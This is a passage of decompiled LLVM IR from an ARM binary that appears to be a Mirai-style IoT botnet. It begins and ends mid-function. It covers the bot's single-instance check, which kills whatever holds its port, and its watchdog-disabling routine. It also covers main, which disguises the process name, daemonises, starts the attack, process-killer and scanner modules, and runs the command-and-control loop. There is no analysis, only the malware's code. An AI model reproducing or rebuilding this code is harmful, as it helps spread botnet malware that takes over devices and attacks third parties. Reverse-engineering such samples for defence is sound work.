  %v15_e7a8 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_e7c4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_24520.119 to i32), i32* @r6, align 4
  %v7_e7cc = icmp eq i32 %v3_e7c4, -1
  store i32 %v3_e7c4, i32* @global_var_24520.119, align 4
  br i1 %v7_e7cc, label %dec_label_pc_e884, label %dec_label_pc_e7d8

dec_label_pc_e7d8:                                ; preds = %entry
  %v2_e7d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e7d8, i32* @r3, align 4
  %v0_e7dc = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_e7ec = call i32 @__GI_setsockopt(i32 %v3_e7c4, i32 %v0_e7dc, i32 2, i32 %v2_e7d8, i32 4)
  %v2_e7f0 = load i32, i32* @global_var_24520.119, align 4
  store i32 %v2_e7f0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_e800 = call i32 @__libc_fcntl(i32 %v2_e7f0, i32 3)
  %v0_e804 = load i32, i32* @r5, align 4
  %v1_e808 = or i32 %v2_e800, 2048
  store i32 %v1_e808, i32* @r2, align 4
  %v0_e80c = load i32, i32* @r4, align 4
  %v2_e810 = call i32 @__libc_fcntl(i32 %v0_e80c, i32 %v0_e804)
  store i32 ptrtoint (i8** @global_var_2452c.121 to i32), i32* @r8, align 4
  %v2_e818 = load i8, i8* bitcast (i8** @global_var_2452c.121 to i8*), align 4
  %v2_e81c = icmp eq i8 %v2_e818, 0
  br i1 %v2_e81c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_e7d8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_e7d8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_e840 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_e848 = inttoptr i32 %v0_e840 to i32*
  store i32 0, i32* %v2_e848, align 4
  %v2_e84c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_e84c, i32* @r5, align 4
  store i32 %v0_e840, i32* @r4, align 4
  %v2_e85c = load i32, i32* @global_var_24520.119, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e868 = call i32 @bind(i32 %v2_e85c, i32 %v2_e84c, i32 16)
  %v7_e86c = icmp eq i32 %v3_e868, -1
  br i1 %v7_e86c, label %dec_label_pc_e890, label %dec_label_pc_e874

dec_label_pc_e874:                                ; preds = %bb20
  %v2_e87c = load i32, i32* @global_var_24520.119, align 4
  %v2_e880 = call i32 @listen(i32 %v2_e87c, i32 1)
  br label %dec_label_pc_e884

dec_label_pc_e884:                                ; preds = %entry, %dec_label_pc_e89c, %dec_label_pc_e874
  %v1_e88c = phi i32 [ %v3_e7c4, %entry ], [ %v1_e8e4, %dec_label_pc_e89c ], [ %v2_e880, %dec_label_pc_e874 ]
  store i32 %v9_e7a8, i32* @r6, align 4
  store i32 %v12_e7a8, i32* @r7, align 4
  store i32 %v15_e7a8, i32* @r8, align 4
  ret i32 %v1_e88c

dec_label_pc_e890:                                ; preds = %bb20
  %v0_e890 = load i32, i32* @r4, align 4
  %v1_e890 = inttoptr i32 %v0_e890 to i32*
  %v2_e890 = load i32, i32* %v1_e890, align 4
  %v7_e894 = icmp eq i32 %v2_e890, 99
  br i1 %v7_e894, label %dec_label_pc_e8ec, label %dec_label_pc_e89c

dec_label_pc_e89c:                                ; preds = %dec_label_pc_e8ec, %bb21, %dec_label_pc_e890
  %v2_e8b4 = load i32, i32* @global_var_24520.119, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_e8c4 = call i32 @__libc_connect(i32 %v2_e8b4, i32 %v2_e84c, i32 16)
  %v1_e8cc = call i32 @sleep(i32 5)
  %v2_e8d0 = load i32, i32* @global_var_24520.119, align 4
  %v1_e8d4 = call i32 @__GI___libc_close(i32 %v2_e8d0)
  %v1_e8e0 = call i32 @killer_kill_by_port(i32 50951)
  %v1_e8e4 = call i32 @ensure_single_instance(i32 %v1_e8e0)
  br label %dec_label_pc_e884

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e890
  %v2_e8ec = load i8, i8* bitcast (i8** @global_var_2452c.121 to i8*), align 4
  %v3_e8ec = zext i8 %v2_e8ec to i32
  %v1_e8f0 = load i32, i32* @r7, align 4
  %v9_e8f0 = icmp eq i32 %v3_e8ec, %v1_e8f0
  br i1 %v9_e8f0, label %dec_label_pc_e89c, label %bb21

bb21:                                             ; preds = %dec_label_pc_e8ec
  %v2_e8f8 = trunc i32 %v1_e8f0 to i8
  store i8 %v2_e8f8, i8* bitcast (i8** @global_var_2452c.121 to i8*), align 4
  br label %dec_label_pc_e89c

; uselistorder directives
  uselistorder i32 %v2_e84c, { 1, 0, 2 }
  uselistorder i32 %v3_e7c4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 0, 2, 1 }
  uselistorder i8* bitcast (i8** @global_var_2452c.121 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_2452c.121, { 1, 0 }
  uselistorder label %dec_label_pc_e89c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e884, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_e90c = load i32, i32* @r4, align 4
  %v6_e90c = load i32, i32* @r5, align 4
  %v0_e914 = call i32 @__libc_fork()
  %v7_e918 = icmp eq i32 %v0_e914, -1
  %. = zext i1 %v7_e918 to i32
  %tmp11 = icmp slt i32 %v0_e914, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_e934 = icmp eq i32 %storemerge4, 0
  store i32 %v0_e914, i32* @global_var_246a4.124, align 4
  br i1 %v2_e934, label %dec_label_pc_e94c, label %dec_label_pc_e940

dec_label_pc_e940:                                ; preds = %entry
  store i32 %v3_e90c, i32* @r4, align 4
  store i32 %v6_e90c, i32* @r5, align 4
  ret i32 %v0_e914

dec_label_pc_e94c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_e958 = call i32 @table_unlock_val(i32 59)
  %v1_e960 = call i32 @table_unlock_val(i32 60)
  %v0_e964 = load i32, i32* @r5, align 4
  %v2_e96c = inttoptr i32 %v0_e964 to i32*
  %v3_e96c = call i32 @table_retrieve_val(i32 59, i32* %v2_e96c)
  %v3_e974 = call i32 @__libc_open(i32 %v3_e96c, i64* inttoptr (i32 2 to i64*))
  %v7_e978 = icmp eq i32 %v3_e974, -1
  store i32 %v3_e974, i32* @r4, align 4
  br i1 %v7_e978, label %dec_label_pc_e9c0, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %dec_label_pc_e9c0, %dec_label_pc_e94c
  %v0_e990 = phi i32 [ %v3_e9d0, %dec_label_pc_e9c0 ], [ %v3_e974, %dec_label_pc_e94c ]
  %v2_e994 = ptrtoint i32* %stack_var_-20 to i32
  %v3_e998 = call i32 @ioctl(i32 %v0_e990, i32 -2147199228, i32 %v2_e994)
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e99c, %dec_label_pc_e984
  %v0_e9a8 = load i32, i32* @r4, align 4
  %v3_e9b0 = call i32 @ioctl(i32 %v0_e9a8, i32 -2147199227, i32 0)
  %v1_e9b8 = call i32 @sleep(i32 10)
  br label %dec_label_pc_e99c

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e94c
  %v0_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c8 = inttoptr i32 %v0_e9c0 to i32*
  %v3_e9c8 = call i32 @table_retrieve_val(i32 60, i32* %v2_e9c8)
  %v3_e9d0 = call i32 @__libc_open(i32 %v3_e9c8, i64* inttoptr (i32 2 to i64*))
  %v3_e9d4 = icmp eq i32 %v3_e9d0, -1
  store i32 %v3_e9d0, i32* @r4, align 4
  br i1 %v3_e9d4, label %dec_label_pc_e9e0, label %dec_label_pc_e984

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9c0
  %v1_e9e4 = call i32 @table_lock_val(i32 59)
  %v1_e9ec = call i32 @table_lock_val(i32 60)
  %v0_e9f0 = load i32, i32* @r5, align 4
  %v1_e9f4 = call i32 @__GI_exit(i32 %v0_e9f0)
  %v0_e9f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e9f8, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_e9e0
  %v2_e9f8 = load i32, i32* @r4, align 4
  %v5_e9f8 = udiv i32 %v2_e9f8, 8192
  %v6_e9f8 = and i32 %v5_e9f8, %arg1
  store i32 %v6_e9f8, i32* @r4, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_e9e0, %bb14
  ret i32 %v1_e9f4

; uselistorder directives
  uselistorder i32 %v3_e9d0, { 1, 2, 0 }
  uselistorder i32 %v3_e974, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_e914, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 59, { 0, 1, 2, 4, 3 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_ea0c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ea0c, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_ea24 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_ea30 = call i32 @__GI_sigaddset(i32 %v2_ea0c, i32 2)
  %v0_ea34 = load i32, i32* @r5, align 4
  store i32 %v0_ea34, i32* %r2.global-to-local, align 4
  %v4_ea40 = call i32 @__GI_sigprocmask(i32 %v0_ea34, i32* nonnull %stack_var_-64, i32 %v0_ea34)
  %v2_ea4c = call i32 @bsd_signal(i32 17, i32 1)
  %v2_ea58 = call i32 @bsd_signal(i32 5, i32 59212)
  %v0_ea5c = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_271c0.114 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_271c4.116, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 6400, i32* %r3.global-to-local, align 4
  store i32 %v0_ea5c, i32* @global_var_271b8.90, align 4
  store i16 6400, i16* bitcast (i32* @global_var_271c2.117 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_271c0.114 to i16*), align 4
  %v6_ea84 = call i32 @table_init(i32 %v0_ea5c, i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32 ptrtoint (i16** @global_var_271c0.114 to i32), i32 6400)
  store i32 ptrtoint (i32* @global_var_e764.110 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24528.112 to i32), i32* @lr, align 4
  %v2_ea90 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_ea90, i32* @sb, align 4
  store i32 ptrtoint (i32* @global_var_e764.110 to i32), i32* @global_var_24528.112, align 4
  %v1_ea98 = call i32 @ensure_single_instance(i32 %v6_ea84)
  %v1_ea9c = call i32 @rand_init(i32 %v1_ea98)
  %v2_eaa8 = call i32 @util_zero(i32 %v2_ea90, i32 32)
  %v0_eaac = load i32, i32* @r6, align 4
  %v7_eaac = icmp eq i32 %v0_eaac, 2
  br i1 %v7_eaac, label %dec_label_pc_ebdc, label %dec_label_pc_eab4

dec_label_pc_eab4:                                ; preds = %dec_label_pc_ebdc, %entry, %dec_label_pc_ebec
  %v0_eab4 = call i32 @rand_next()
  store i32 %v0_eab4, i32* @r6, align 4
  %v0_eabc = load i32, i32* @r8, align 4
  %v1_eabc = inttoptr i32 %v0_eabc to i32*
  %v2_eabc = load i32, i32* %v1_eabc, align 4
  %v1_eac0 = inttoptr i32 %v2_eabc to i8*
  %v2_eac0 = call i32 @util_strlen(i8* %v1_eac0)
  %v0_eac8 = load i32, i32* @r8, align 4
  %v1_eac8 = inttoptr i32 %v0_eac8 to i32*
  %v2_eac8 = load i32, i32* %v1_eac8, align 4
  %v1_eacc = inttoptr i32 %v2_eac8 to i8*
  %v2_eacc = call i32 @util_strlen(i8* %v1_eacc)
  %v1_ead0 = sub i32 20, %v2_eac0
  %v0_ead8 = load i32, i32* @r6, align 4
  %v3_eadc = urem i32 %v0_ead8, %v1_ead0
  %v2_eae0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_eae0, i32* @r5, align 4
  %v2_eae4 = add i32 %v3_eadc, %v2_eacc
  store i32 %v2_eae4, i32* @r4, align 4
  %v2_eaf0 = call i32 @rand_alphastr(i32 %v2_eae0, i32 %v2_eae4)
  %v2_eaf4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_eaf8 = load i32, i32* @r4, align 4
  %v2_eaf8 = add i32 %v1_eaf8, %v2_eaf4
  store i32 %v2_eaf8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_eb04 = load i32, i32* @r8, align 4
  %v1_eb04 = inttoptr i32 %v0_eb04 to i32*
  %v2_eb04 = load i32, i32* %v1_eb04, align 4
  store i32 %v2_eb04, i32* @r0, align 4
  %v3_eb08 = add i32 %v2_eaf8, -80
  %v4_eb08 = inttoptr i32 %v3_eb08 to i8*
  store i8 0, i8* %v4_eb08, align 1
  %v2_eb0c = inttoptr i32 %v2_eb04 to i8*
  %v3_eb0c = call i32 @util_strcpy(i8* %v2_eb0c, i32 %v2_eae0)
  %v2_eb18 = call i32 @util_zero(i32 %v2_eae0, i32 32)
  %v0_eb1c = call i32 @rand_next()
  store i32 %v0_eb1c, i32* @r7, align 4
  %v0_eb24 = load i32, i32* @r8, align 4
  %v1_eb24 = inttoptr i32 %v0_eb24 to i32*
  %v2_eb24 = load i32, i32* %v1_eb24, align 4
  %v1_eb28 = inttoptr i32 %v2_eb24 to i8*
  %v2_eb28 = call i32 @util_strlen(i8* %v1_eb28)
  store i32 %v2_eb28, i32* @r6, align 4
  %v0_eb30 = load i32, i32* @r8, align 4
  %v1_eb30 = inttoptr i32 %v0_eb30 to i32*
  %v2_eb30 = load i32, i32* %v1_eb30, align 4
  %v1_eb34 = inttoptr i32 %v2_eb30 to i8*
  %v2_eb34 = call i32 @util_strlen(i8* %v1_eb34)
  %v0_eb38 = load i32, i32* @r6, align 4
  %v1_eb38 = sub i32 20, %v0_eb38
  %v0_eb40 = load i32, i32* @r7, align 4
  %v3_eb44 = urem i32 %v0_eb40, %v1_eb38
  %v2_eb48 = add i32 %v3_eb44, %v2_eb34
  store i32 %v2_eb48, i32* @r4, align 4
  %v2_eb54 = call i32 @rand_alphastr(i32 %v2_eae0, i32 %v2_eb48)
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v1_eb5c = load i32, i32* @r4, align 4
  %v2_eb5c = add i32 %v1_eb5c, %v2_eaf4
  store i32 %v2_eb5c, i32* %r3.global-to-local, align 4
  %v0_eb60 = load i32, i32* @sl, align 4
  %v1_eb60 = trunc i32 %v0_eb60 to i8
  %v3_eb60 = add i32 %v2_eb5c, -80
  %v4_eb60 = inttoptr i32 %v3_eb60 to i8*
  store i8 %v1_eb60, i8* %v4_eb60, align 1
  %v4_eb6c = call i32 @prctl(i32 15, i32 %v2_eae0, i32 %v2_eaf4, i32 %v2_eb5c)
  %v1_eb74 = call i32 @table_unlock_val(i32 5)
  %v3_eb84 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_eb88 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_eb88, i32* @r2, align 4
  %v2_eb94 = call i32 @__GI___libc_write(i32 1, i32 %v3_eb84)
  store i32 1, i32* @r2, align 4
  %v2_eba4 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_1b3f8.132 to i32))
  %v1_ebac = call i32 @table_lock_val(i32 5)
  %v1_ebb0 = call i32 @attack_init(i32 %v1_ebac)
  %v1_ebb4 = call i32 @killer_init(i32 %v1_ebb0)
  %v1_ebb8 = call i32 @watchdog_maintain(i32 %v1_ebb4)
  %v0_ebbc = call i32 @__libc_fork()
  %v1_ebc0 = load i32, i32* @sl, align 4
  %v7_ebc4 = icmp sgt i32 %v0_ebbc, %v1_ebc0
  br i1 %v7_ebc4, label %dec_label_pc_ebc8, label %dec_label_pc_ec14

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_eab4
  ret i32 %v1_ebc0

dec_label_pc_ebdc:                                ; preds = %entry
  %v0_ebdc = load i32, i32* @r8, align 4
  %v1_ebdc = add i32 %v0_ebdc, 4
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  %v3_ebdc = load i32, i32* %v2_ebdc, align 4
  %v1_ebe0 = inttoptr i32 %v3_ebdc to i8*
  %v2_ebe0 = call i32 @util_strlen(i8* %v1_ebe0)
  %v8_ebe8 = icmp sgt i32 %v2_ebe0, 31
  br i1 %v8_ebe8, label %dec_label_pc_eab4, label %dec_label_pc_ebec

dec_label_pc_ebec:                                ; preds = %dec_label_pc_ebdc
  %v0_ebec = load i32, i32* @r8, align 4
  %v1_ebec = add i32 %v0_ebec, 4
  %v2_ebec = inttoptr i32 %v1_ebec to i32*
  %v3_ebec = load i32, i32* %v2_ebec, align 4
  store i32 %v2_ea90, i32* @r0, align 4
  %v2_ebf4 = bitcast i32* %stack_var_-152 to i8*
  %v3_ebf4 = call i32 @util_strcpy(i8* %v2_ebf4, i32 %v3_ebec)
  %v0_ebf8 = load i32, i32* @r8, align 4
  %v1_ebf8 = add i32 %v0_ebf8, 4
  %v2_ebf8 = inttoptr i32 %v1_ebf8 to i32*
  %v3_ebf8 = load i32, i32* %v2_ebf8, align 4
  %v1_ec00 = inttoptr i32 %v3_ebf8 to i8*
  %v2_ec00 = call i32 @util_strlen(i8* %v1_ec00)
  %v2_ec0c = call i32 @util_zero(i32 %v3_ebf8, i32 %v2_ec00)
  br label %dec_label_pc_eab4

dec_label_pc_ec14:                                ; preds = %dec_label_pc_eab4
  %v1_ec14 = call i32 @__GI_setsid(i32 %v0_ebbc)
  %v0_ec1c = load i32, i32* @sl, align 4
  %v1_ec20 = call i32 @__GI___libc_close(i32 %v0_ec1c)
  %v1_ec28 = call i32 @__GI___libc_close(i32 1)
  %v1_ec30 = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_24524.134 to i32), i32* @fp, align 4
  %v1_ec38 = call i32 @attack_init(i32 %v1_ec30)
  %v1_ec3c = call i32 @killer_init(i32 %v1_ec38)
  %v1_ec40 = call i32 @watchdog_maintain(i32 %v1_ec3c)
  %v1_ec44 = call i32 @scanner_init(i32 %v1_ec40)
  %v0_ec48 = load i32, i32* @sl, align 4
  %v2_ec4c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_ec4c, i32* @r7, align 4
  %v2_ec50 = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_ec50, i32* @r6, align 4
  %v2_ed30 = ptrtoint i32* %stack_var_-72 to i32
  %v2_ed80 = ptrtoint i32* %stack_var_-168 to i32
  %v2_ef5c = ptrtoint i32* %stack_var_-56 to i32
  %v2_ef64 = ptrtoint i8** %stack_var_-42 to i32
  %v2_f10c = ptrtoint i32* %stack_var_-1432 to i32
  %v2_ef80 = ptrtoint i32* %stack_var_-52 to i32
  %v1_f034 = bitcast i32* %stack_var_-152 to i8*
  %v2_eff4 = ptrtoint i32* %stack_var_-88 to i32
  %v1_f010 = sub i32 0, %v1_ec14
  br label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_f094, %dec_label_pc_f130, %bb44, %dec_label_pc_f030, %dec_label_pc_ee64, %dec_label_pc_ee54, %bb41, %dec_label_pc_f184, %dec_label_pc_f0f0, %dec_label_pc_f0a4, %dec_label_pc_f080, %dec_label_pc_efac, %dec_label_pc_eed4, %dec_label_pc_ee0c, %dec_label_pc_ec14
  %stack_var_-1436.0 = phi i32 [ %v0_ec48, %dec_label_pc_ec14 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_ee54 ], [ %stack_var_-1436.1, %dec_label_pc_ee64 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_f0a4 ], [ %stack_var_-1436.1, %dec_label_pc_eed4 ], [ %stack_var_-1436.1, %dec_label_pc_f130 ], [ %stack_var_-1436.1, %dec_label_pc_f184 ], [ %stack_var_-1436.1, %dec_label_pc_f0f0 ], [ %stack_var_-1436.1, %dec_label_pc_ee0c ], [ %stack_var_-1436.1, %dec_label_pc_f030 ], [ %stack_var_-1436.1, %dec_label_pc_f080 ], [ %stack_var_-1436.1, %dec_label_pc_efac ], [ %stack_var_-1436.1, %dec_label_pc_f094 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ec54
  %v1_ec64 = phi i32 [ %v1_ec68, %dec_label_pc_ec60 ], [ 4, %dec_label_pc_ec54 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ec64 = load i32, i32* @r7, align 4
  %v3_ec64 = add i32 %v2_ec64, %v1_ec64
  %v4_ec64 = inttoptr i32 %v3_ec64 to i32*
  store i32 0, i32* %v4_ec64, align 4
  %v0_ec68 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec68 = add i32 %v0_ec68, 4
  store i32 %v1_ec68, i32* %r3.global-to-local, align 4
  %v7_ec6c = icmp eq i32 %v1_ec68, 128
  br i1 %v7_ec6c, label %dec_label_pc_ec74, label %dec_label_pc_ec60

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec60
  %v0_ec74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ec74, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec7c, %dec_label_pc_ec74
  %v1_ec80 = phi i32 [ %v1_ec84, %dec_label_pc_ec7c ], [ 4, %dec_label_pc_ec74 ]
  store i32 0, i32* @r4, align 4
  %v2_ec80 = load i32, i32* @r6, align 4
  %v3_ec80 = add i32 %v2_ec80, %v1_ec80
  %v4_ec80 = inttoptr i32 %v3_ec80 to i32*
  store i32 0, i32* %v4_ec80, align 4
  %v0_ec84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec84 = add i32 %v0_ec84, 4
  store i32 %v1_ec84, i32* %r3.global-to-local, align 4
  %v7_ec88 = icmp eq i32 %v1_ec84, 128
  br i1 %v7_ec88, label %dec_label_pc_ec90, label %dec_label_pc_ec7c

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec7c
  store i32 ptrtoint (i32* @global_var_24520.119 to i32), i32* %r3.global-to-local, align 4
  %v2_ec94 = load i32, i32* @global_var_24520.119, align 4
  %v7_ec98 = icmp eq i32 %v2_ec94, -1
  br i1 %v7_ec98, label %dec_label_pc_ecc4, label %dec_label_pc_eca0

dec_label_pc_eca0:                                ; preds = %dec_label_pc_ec90
  %v3_eca0 = udiv i32 %v2_ec94, 32
  %v3_eca4 = mul nuw nsw i32 %v3_eca0, 4
  store i32 %v2_eaf4, i32* %ip.global-to-local, align 4
  %v2_ecac = add i32 %v3_eca4, %v2_eaf4
  store i32 %v2_ecac, i32* %r3.global-to-local, align 4
  %v1_ecb0 = add i32 %v2_ecac, -240
  %v2_ecb0 = inttoptr i32 %v1_ecb0 to i32*
  %v3_ecb0 = load i32, i32* %v2_ecb0, align 4
  %v1_ecb4 = urem i32 %v2_ec94, 32
  %v7_ecbc = shl i32 1, %v1_ecb4
  %v8_ecbc = or i32 %v3_ecb0, %v7_ecbc
  store i32 %v8_ecbc, i32* %r2.global-to-local, align 4
  store i32 %v8_ecbc, i32* %v2_ecb0, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ec90, %dec_label_pc_eca0
  %v2_ecc4 = load i32, i32* @global_var_24524.134, align 4
  store i32 %v2_ecc4, i32* @r3, align 4
  %v7_ecc8 = icmp eq i32 %v2_ecc4, -1
  store i32 ptrtoint (i32* @global_var_24524.134 to i32), i32* @r8, align 4
  br i1 %v7_ecc8, label %dec_label_pc_eeec, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_eeec, %dec_label_pc_ecc4, %bb43
  %v2_ecd8 = load i8, i8* bitcast (i8** @global_var_246a8.137 to i8*), align 4
  %v2_ecdc = icmp eq i8 %v2_ecd8, 0
  %v2_ee28 = load i32, i32* @global_var_24524.134, align 4
  store i32 %v2_ee28, i32* %ip.global-to-local, align 4
  %v3_ee2c = udiv i32 %v2_ee28, 32
  store i32 %v3_ee2c, i32* %r3.global-to-local, align 4
  br i1 %v2_ecdc, label %dec_label_pc_ee28, label %dec_label_pc_ece4

dec_label_pc_ece4:                                ; preds = %dec_label_pc_ecd4
  %v3_ecf0 = mul nuw nsw i32 %v3_ee2c, 4
  %v2_ecf4 = add i32 %v3_ecf0, %v2_eaf4
  store i32 %v2_ecf4, i32* %r3.global-to-local, align 4
  %v1_ecf8 = add i32 %v2_ecf4, -368
  %v2_ecf8 = inttoptr i32 %v1_ecf8 to i32*
  %v3_ecf8 = load i32, i32* %v2_ecf8, align 4
  %v1_ecfc = urem i32 %v2_ee28, 32
  %v7_ed04 = shl i32 1, %v1_ecfc
  %v8_ed04 = or i32 %v3_ecf8, %v7_ed04
  store i32 %v8_ed04, i32* %r2.global-to-local, align 4
  store i32 %v8_ed04, i32* %v2_ecf8, align 4
  br label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ee28, %dec_label_pc_ece4
  store i32 ptrtoint (i32* @global_var_24520.119 to i32), i32* %r3.global-to-local, align 4
  %v2_ed10 = load i32, i32* @global_var_24520.119, align 4
  store i32 0, i32* @lr, align 4
  %v0_ed18 = load i32, i32* %ip.global-to-local, align 4
  %v5_ed1c = icmp slt i32 %v0_ed18, %v2_ed10
  br i1 %v5_ed1c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_ed0c
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_ed0c, %bb
  %v0_ed2c = phi i32 [ %v2_ed10, %dec_label_pc_ed0c ], [ %v0_ed18, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_ed2c = add i32 %v0_ed2c, 1
  store i32 %v2_ed30, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_ec50, i32* %r2.global-to-local, align 4
  %v5_ed48 = call i32 @__libc_select(i32 %v1_ed2c, i32 %v2_ec4c, i32 %v2_ec50, i32 0, i32 %v2_ed30)
  %v8_ed4c = icmp eq i32 %v5_ed48, -1
  br i1 %v8_ed4c, label %dec_label_pc_ec54, label %dec_label_pc_ed54

dec_label_pc_ed54:                                ; preds = %bb41
  %v6_ed48 = trunc i32 %v5_ed48 to i16
  %v3_ed54 = icmp eq i16 %v6_ed48, 0
  br i1 %v3_ed54, label %dec_label_pc_ed5c, label %dec_label_pc_ed90

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed54
  %v5_ed68 = srem i32 %stack_var_-1436.0, 6
  %v4_ed70 = sub i32 %stack_var_-1436.0, %v5_ed68
  store i32 %v4_ed70, i32* %r3.global-to-local, align 4
  %v2_ed78 = icmp eq i32 %v5_ed68, 0
  %v1_ed7c = add i32 %stack_var_-1436.0, 1
  store i32 %v1_ed7c, i32* @lr, align 4
  store i32 %v2_ed80, i32* %r2.global-to-local, align 4
  %v7_ed84 = inttoptr i32 %v5_ed48 to i8*
  store i8* %v7_ed84, i8** %stack_var_-42, align 4
  br i1 %v2_ed78, label %dec_label_pc_ef5c, label %dec_label_pc_ed90

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed54, %dec_label_pc_ed5c, %dec_label_pc_ef5c
  %stack_var_-1436.1 = phi i32 [ %v1_ed7c, %dec_label_pc_ef5c ], [ %v1_ed7c, %dec_label_pc_ed5c ], [ %stack_var_-1436.0, %dec_label_pc_ed54 ]
  store i32 ptrtoint (i32* @global_var_24520.119 to i32), i32* %r3.global-to-local, align 4
  %v2_ed94 = load i32, i32* @global_var_24520.119, align 4
  %v7_ed98 = icmp eq i32 %v2_ed94, -1
  br i1 %v7_ed98, label %dec_label_pc_edc4, label %dec_label_pc_eda0

dec_label_pc_eda0:                                ; preds = %dec_label_pc_ed90
  %v3_eda0 = udiv i32 %v2_ed94, 32
  %v3_eda4 = mul nuw nsw i32 %v3_eda0, 4
  store i32 %v2_eaf4, i32* %ip.global-to-local, align 4
